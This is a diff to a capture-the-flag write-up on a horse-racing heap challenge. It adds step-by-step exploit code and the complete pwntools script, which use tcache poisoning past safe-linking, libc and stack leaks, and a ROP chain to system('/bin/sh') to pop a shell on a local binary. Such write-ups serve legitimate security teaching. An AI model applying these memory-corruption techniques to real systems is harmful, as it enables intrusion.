@@ -183,7 +183,7 @@ then malloc until we get an allocation pointing to where we specified. However, 
 jumbling the next pointer. If we are to do tcache poisoning, we will have to replicate this pointer jumbling. 
 
 Thankfully, the pointer jumbling is rather simple. It just XORs the pointer with the address of the allocation, shifted
-12 bits to the left. In other words, the next pointer is XORed with the random bits from the address of the allocation. 
+12 bits to the right. In other words, the next pointer is XORed with the random bits from the address of the allocation. 
 
 We do not yet have the luxury of the cheat option yet, however we can abuse the fact that the function which reads the name of
 the horse stops reading characters once it sees a 0xFF byte. Knowing this, the ASLR bits of these heap allocations can be leaked as follows:
@@ -229,10 +229,219 @@ Now we get to be a dirty cheater and get away with it. An address in LIBC can be
 as follows:
 
 ```
+add_horse(0, 256, b'i' * 256)
+add_horse(1, 256, b'i' * 256)
+
+remove_horse(1)
+remove_horse(0)
+
+cheat(0, p64(0x4040E0 ^ aslr) + b'\xFF', 0)
+
+add_horse(0, 256, b'\x00' * 256)
+add_horse(1, 256, b'\xFF')
+
+leak = aslr
+while leak == aslr or leak == 0:
+┊   race()
+┊   p.recvuntil(b'WINNER: ')
+┊   leak = int.from_bytes(p.recvuntil(b'\n').replace(b'\n', b''), 'little')
+libc_base = leak - 0x1BE5E0
+print("Libc base: " + hex(libc_base))
+```
+
+Output:
+
+![image](https://user-images.githubusercontent.com/96510931/228106106-e3b8fed0-da3c-4c6d-b75b-41882caa12b5.png)
+
+
+Looks promising once again. Because I added horse 0 and 1 then removed them both immediately after, they enter the tcache. Next, I
+use the cheat option to overwrite the next pointer. Note, because of the safe-linking pointer jumbling, the address we want to overwrite needs
+to be XORed with the ASLR bits leaked earlier. 
+
+After I re-add horse 1, we're given an allocation at 0x4040E0. I chose to place this allocation at 0x4040E0 for a few reasons. In the following
+screenshot, I was able to attach to the process in GDB and inspect the return value in $rax immediately after returning from the malloc call
+which gives us the allocation at 0x4040E0 to help me explain why.
+
+![image](https://user-images.githubusercontent.com/96510931/228103248-5761dbe4-b83e-4429-812f-3aab8b74e530.png)
+
+We can in fact see that malloc returned 0x4040E0 indicating that our allocation was placed at 0x4040E0. My reasoning behind this specific choice
+for an address to place an allocation on top of is as follows:
+- First, since this points to directly to stderr, we are able to leak an address in LIBC which can be used to calculate the base address of LIBC.
+- Second, the 8-bytes after the first 8-bytes are zeroed out. These next 8-bytes are known as the "key" as far as heap metadata is concerned, and they
+  are zeroed out when a malloc occurs. This is actually good, because this behavior from malloc just zeroed out the .bss variable which is preventing
+  us from racing again.
+- Third, in newer versions of LIBC all allocations have to follow a certain alignment. Specifically, the 4 least significant bits must all be zero.
+
+So with this specific allocation placement, we are able to bypass their cheating check, and also get a pointer directly to a LIBC address which will
+be printed as if it were a horses name once the horse with this particular allocation wins. I'm aware that the names are also printed while they are
+racing, I just felt using p.recvuntil(b'WINNER: ') then reading what came after was a little cleaner. My while loop simply just waits for the horse
+associated with our malicious allocation to win so we can capture the LIBC leak once it's printed after the word WINNER.
+
+### Finding the stack (and a return pointer)
+
+We are going to need to set up another race to leak something from the stack. Since we now know where LIBC is, we can actually locate the stack by
+finding a pointer in LIBC and leaking it. I have found myself needing to do this in the past, and I typically resort to the .bss section of LIBC. In
+the following screenshots, there is a pointer which points to something on the stack. We can confirm this comes from the stack by looking at output
+from info proc mappings.
+
+![image](https://user-images.githubusercontent.com/96510931/228108148-2684426c-cc23-4a27-823f-455227342183.png)
+
+![image](https://user-images.githubusercontent.com/96510931/228108227-251c4fc3-6de5-4df1-8733-b910024b49ef.png)
+
+![image](https://user-images.githubusercontent.com/96510931/228108372-048b2c57-72c9-4e8b-bbff-470eddd513a2.png)
+
+This particular address is always a specific distance away from the base address of LIBC, and can be leaked as follows:
+
+```
+remove_horse(3)
+remove_horse(2)
+
+cheat(2, p64((libc_base + 0x1bf620) ^ aslr) + b'\xFF', 2)
+
+add_horse(2, 256, b'\xFF')
+add_horse(3, 256, b'\xFF')
+
+remove_horse(5)
+remove_horse(4)
+
+cheat(4, p64(0x4040E0 ^ aslr) + b'\xFF', 4)
+
+add_horse(4, 256, b'\x00' * 256)
+add_horse(5, 256, b'\xFF')
+
+another_leak = 0
+while another_leak == 0 or another_leak == leak or another_leak == aslr:
+┊   race()
+┊   p.recvuntil(b'WINNER: ')
+┊   another_leak = int.from_bytes(p.recvuntil(b'\n').replace(b'\n', b''), 'little')
+print(f"stack leak is: {hex(another_leak)}")
+```
+
+In this chunk of code, horses 2 and 3 are placed into tcache, the cheat option is used to overwrite a next pointer, and the
+chunks are reallocated. Nothing but 0xFF bytes are given for the names so that the value we want to leak is not changed as the
+name is read. Then 2 and 3 are re-allocated giving us a pointer which points to a pointer to something on the stack, which will
+be printed when the corresponding horse to the allocation wins the race, just like before. Next, just like when we leaked LIBC, 
+an allocation is placed on top of stderr and the .bss variable which is used to determine if we are cheating is cleared again by
+malloc. My while loop for this race was a little messy, but by the end of it we will have a stack leak.
+
+Output (with verification that the leaked address is from the stack):
+
+![image](https://user-images.githubusercontent.com/96510931/228109659-9ae144f6-42b5-4b9b-8b18-0f338829703e.png)
+
+### Finding a return pointer to overwrite
+
+Before thinking about the ROP chain, we have to know where to put it. Since we have obtained some pointer that points to something
+on the stack, we can find a return pointer that lives close to it and use GDB to calculate the offset between our leak and the return
+pointer. I decided to overwrite the return pointer belonging to main's stack frame so that once I choose option 4, we will get
+our shell instead of exiting.
+
+![image](https://user-images.githubusercontent.com/96510931/228112567-02a90286-3ffa-4078-837d-1175f3b22895.png)
+
+Doing this is totally okay since all the exit option does (case 4 in the screenshot above) is alter the v6 variable which prevents
+the while loop from looping any further. If option 4 had utilized a call to exit(), main's return pointer would not be a good choice.
+
+In the screenshot below, I've broken somewhere in main and ran info frame to locate where the return pointer is:
+
+![image](https://user-images.githubusercontent.com/96510931/228111378-2a3be632-fab5-456a-add1-84d81d2d9c5a.png)
+
+Next, still while in GDB, I let my script do it's thing and give me the stack address it is now able to leak:
+
+![image](https://user-images.githubusercontent.com/96510931/228111461-910cc922-1427-4e1c-8592-0beb7972d420.png)
+
+Next, we can easily calculate how much we need to subtract from our leak to determine where the saved rip of main is:
+
+![image](https://user-images.githubusercontent.com/96510931/228111858-7ce5b118-1a75-4adc-9d3c-9c4524390829.png)
+
+There is one more thing to consider before trying to place an allocation on top of the saved RIP, and that is we cannot just place an
+allocation directly on top of the saved RIP. The reason being is because it does not meet the alignment requirements that are
+forced upon us by newer versions of LIBC. So, instead of subtracting 0xF0 bytes from the stack leak I will subtract 0xF8 and just remember
+that I will need 8 extra padding bytes to align the start of my ROP chain properly.
+
+### Creating and sending the ROP chain
+
+As I mentioned earlier, I want to pop a shell. So all I need to construct my ROP chain is a pop rdi gadget, a "/bin/sh" string, and a way
+to call the system function which the vulnerable binary kindly provides to us via the PLT. Finally, when constructing the final payload
+all I need is an additional 8 garbage bytes before the ROP chain, and I also added a 0xFF byte just so it wouldn't try to keep reading.
+
+```
+ret_ptr_loc = another_leak - 0xF8
+print(f"return pointer is at: {hex(ret_ptr_loc)}")
+
+libc = ELF('./libc.so.6')
+rop = ROP(libc)
+
+pop_rdi = libc_base + rop.find_gadget(['pop rdi', 'ret'])[0]
+bin_sh  = libc_base + next(libc.search(b'/bin/sh'))
+
+chain = p64(pop_rdi) + p64(bin_sh) + p64(e.plt['system'])
+payload = p64(0) + chain + b'\xFF'
+
+remove_horse(7)
+remove_horse(6)
+
+cheat(6, p64(ret_ptr_loc ^ aslr) + b'\xFF', 6)
+
+add_horse(6, 256, b'\xFF')
+add_horse(7, 256, payload)
+```
+
+The same heap trickery is used to get an allocation 8 bytes before main's return pointer. The return pointer is overwritten after the malloc
+when they prompt the user for the name of the horse, so we provide the payload as the name to add_horse() for allocation 7. Lastly, we can
+do some quick checks to make sure everything landed in the right place in GDB:
+
+![image](https://user-images.githubusercontent.com/96510931/228116208-66947080-9e4a-4d55-808f-555811a0b7f8.png)
+
+Bingo!
+
+### Popping a shell
+
+The rest is easy. Since we overwrote the return pointer in main, all we have to do is give '4' to the prompt to choose the exit option to stop
+the while loop and return from main. Note, my scripting is far from perfect so it may take a couple tries:
+
+```
+p.sendline(b'4')
+p.interactive()
+```
+
+Yeah, I'm just sending '4' because I was too lazy to write a wrapper function for option 4 at this point.
+
+# The final script, and result
+
+The final script:
+
+```
+from pwn import *
+
+p = process('./vuln')
+e = ELF('./vuln')
+
+# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ #
+
+def cheat(index, name, newspot):
+    p.sendline(b'0')
+    p.sendline(str(index).encode())
+    p.sendline(name)
+    p.sendline(str(newspot).encode())
+
+def add_horse(index, length, name):
+    p.sendline(b'1')
+    p.sendline(str(index).encode())
+    p.sendline(str(length).encode())
+    p.sendline(name)
+
+def remove_horse(index):
+    p.sendline(b'2')
+    p.sendline(str(index).encode())
+
+def race():
+    p.sendline(b'3')
+
+# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ #
+
 for i in range(8):
-┊   add_horse(i, 256, b'i' * 256)
-┊   remove_horse(i)
-┊   add_horse(i, 256, b'\xFF')
+    add_horse(i, 256, b'i' * 256)
+    remove_horse(i)
+    add_horse(i, 256, b'\xFF')
 race()
 
 p.recvuntil(b'WINNER: ')
@@ -241,11 +450,82 @@ print(f'aslr: {hex(aslr)}')
 
 remove_horse(0)
 remove_horse(1)
+
+# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ #
+
+add_horse(0, 256, b'i' * 256)
+add_horse(1, 256, b'i' * 256)
+
+remove_horse(1)
+remove_horse(0)
+
+cheat(0, p64(0x4040E0 ^ aslr) + b'\xFF', 0)
+
+add_horse(0, 256, b'\x00' * 256)
+add_horse(1, 256, b'\xFF')
+
+leak = aslr
+while leak == aslr or leak == 0:
+    race()
+    p.recvuntil(b'WINNER: ')
+    leak = int.from_bytes(p.recvuntil(b'\n').replace(b'\n', b''), 'little')
+libc_base = leak - 0x1BE5E0
+print("Libc base: " + hex(libc_base))
+
+# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ #
+
+remove_horse(3)
+remove_horse(2)
+
+cheat(2, p64((libc_base + 0x1bf620) ^ aslr) + b'\xFF', 2)
+
+add_horse(2, 256, b'\xFF')
+add_horse(3, 256, b'\xFF')
+
+remove_horse(5)
+remove_horse(4)
+
+cheat(4, p64(0x4040E0 ^ aslr) + b'\xFF', 4)
+
+add_horse(4, 256, b'\x00' * 256)
+add_horse(5, 256, b'\xFF')
+
+another_leak = 0
+while another_leak == 0 or another_leak == leak or another_leak == aslr:
+    race()
+    p.recvuntil(b'WINNER: ')
+    another_leak = int.from_bytes(p.recvuntil(b'\n').replace(b'\n', b''), 'little')
+print(f"stack leak is: {hex(another_leak)}")
+
+# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ #
+
+ret_ptr_loc = another_leak - 0xF8
+print(f"return pointer is at: {hex(ret_ptr_loc)}")
+
+libc = ELF('./libc.so.6')
+rop = ROP(libc)
+
+pop_rdi = libc_base + rop.find_gadget(['pop rdi', 'ret'])[0]
+bin_sh  = libc_base + next(libc.search(b'/bin/sh'))
+
+chain = p64(pop_rdi) + p64(bin_sh) + p64(e.plt['system'])
+payload = p64(0) + chain + b'\xFF'
+
+remove_horse(7)
+remove_horse(6)
+
+cheat(6, p64(ret_ptr_loc ^ aslr) + b'\xFF', 6)
+
+add_horse(6, 256, b'\xFF')
+add_horse(7, 256, payload)
+
+# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ #
+
+p.sendline(b'4')
+p.interactive()
 ```
 
-Output:
+Output (after running it a few times, again it's not perfect):
 
-![image](https://user-images.githubusercontent.com/96510931/228084473-a2ddb978-16b9-46f7-92ac-864a0e7f2108.png)
-
-Looks promising once again, but there is a bit of luck involved. TODO
+![image](https://user-images.githubusercontent.com/96510931/228116896-a9be5add-79b5-48df-8f33-9b336ca2dcc3.png)
 
